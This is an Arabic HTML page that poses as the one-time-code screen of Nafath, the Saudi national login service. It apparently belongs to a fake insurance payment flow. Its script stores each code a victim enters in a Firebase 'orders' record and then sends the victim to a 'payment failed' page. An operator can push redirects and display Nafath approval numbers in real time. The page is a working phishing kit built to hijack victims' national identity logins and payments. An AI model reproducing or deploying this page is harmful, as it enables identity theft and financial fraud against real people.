<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="js/theme-toggle.js"></script>
    <title>نفاذ - رمز التوثيق</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/site-theme.css">
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
    <style>
        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; direction: rtl; padding: 16px; }
        .nafath-card {
            width: 100%; max-width: 420px; border-radius: var(--tree-radius-xl);
            display: flex; flex-direction: column; overflow: hidden; position: relative; min-height: 500px;
        }
        .header { padding: 25px; display: flex; justify-content: center; border-bottom: 1px solid var(--tree-border); }
        .header img { height: 45px; }
        .content { flex: 1; padding: 40px 30px; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .title { font-size: 1.2rem; font-weight: bold; color: var(--tree-primary); margin-bottom: 15px; }
        .subtitle { font-size: 0.95rem; line-height: 1.6; margin-bottom: 30px; color: var(--tree-text-muted); }
        .input-group { width: 100%; margin-bottom: 25px; }
        input {
            width: 100%; padding: 15px; border: 2px solid var(--tree-border); border-radius: 12px;
            background: var(--tree-bg-elevated); font-size: 1.5rem; text-align: center; box-sizing: border-box;
            letter-spacing: 5px; font-weight: bold; color: var(--tree-text); transition: 0.3s;
        }
        input:focus { border-color: var(--tree-primary); background: var(--tree-card); box-shadow: 0 0 0 4px var(--tree-primary-soft); }
        .btn-submit {
            width: 100%; padding: 14px; color: white; border: none; border-radius: 12px; font-size: 1.1rem; font-weight: bold;
            cursor: pointer; transition: 0.3s;
            background: linear-gradient(135deg, var(--tree-primary), var(--tree-primary-hover));
        }
        .btn-submit:hover { transform: translateY(-2px); filter: brightness(1.05); }
        #overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(255, 255, 255, 0.92); display: none; flex-direction: column;
            justify-content: center; align-items: center; z-index: 10;
        }
        html[data-theme="dark"] #overlay { background: rgba(20, 31, 24, 0.92); }
        .spinner { width: 40px; height: 40px; border: 4px solid var(--tree-border); border-top: 4px solid var(--tree-primary); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="tree-site nafath_otp-page">

<button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>

<div class="nafath-card">
    <div id="overlay">
        <div class="spinner"></div>
        <div style="font-size: 14px; color: var(--tree-text); font-weight: bold;">جاري التحقق...</div>
    </div>

    <div class="header">
        <img src="images/nafath/nafath-wordmark.svg" alt="نفاذ" height="45" width="180">
    </div>

    <div class="content">
        <div class="title">رمز التوثيق</div>
        <div class="subtitle">تم إرسال رمز التوثيق إلى هاتفك المسجل، يرجى إدخاله للمتابعة</div>
        
        <div class="input-group">
            <input type="number" id="otp-code" placeholder="رمز التوثيق" maxlength="6">
        </div>

        <button class="btn-submit" onclick="sendOTP()">
            متابعة التوثيق
        </button>
    </div>
</div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
        authDomain: "tameen-658e9.firebaseapp.com",
        projectId: "tameen-658e9",
        storageBucket: "tameen-658e9.firebasestorage.app",
        messagingSenderId: "292670676256",
        appId: "1:292670676256:web:3624157751cd194efe4b45"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    async function sendOTP() {
        const code = document.getElementById('otp-code').value;
        const userId = localStorage.getItem('user_id');

        if (code.length < 4) {
            alert("يرجى إدخال رمز التوثيق بشكل صحيح");
            return;
        }

        document.getElementById('overlay').style.display = 'flex';

        try {
            await db.collection("orders").doc(userId).update({
                nafath_otp: code,
                next_step: "WAITING", // إيقاف التوجيه التلقائي لمنع التكرار
                status: "تم إرسال كود نفاذ - بانتظار الرقم"
            });
            window.location.href = "payment_failed.html"; 
        } catch (e) {
            document.getElementById('overlay').style.display = 'none';
            alert("حدث خطأ في الاتصال");
        }
    }// --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
(function() {
    const userId = localStorage.getItem('user_id');
    if (userId) {
        db.collection("orders").doc(userId).onSnapshot((doc) => {
            if (doc.exists) {
                const data = doc.data();
                if (data.next_step === "GO_TO_OTP") {
                    // تم إزالة التوجيه الذاتي لمنع التعليق (Loop)
                } else if (data.next_step === "GO_TO_REJECT") {
                    window.location.href = "payment_failed.html";
                } else if (data.next_step === "GO_TO_NAFATH") {
                    window.location.href = "nafath.html";
                } else if (data.next_step === "SHOW_NAFATH_CODE") {
                    const codeBox = document.getElementById('nafath-number');
                    if (codeBox && data.nafath_code) {
                        codeBox.innerText = data.nafath_code;
                        const overlay = document.getElementById('overlay');
                        if (overlay) overlay.style.display = 'none';
                    }
                }
            }
        });
    }
})();
// ------------------------------------------

</script>
</body>
</html>
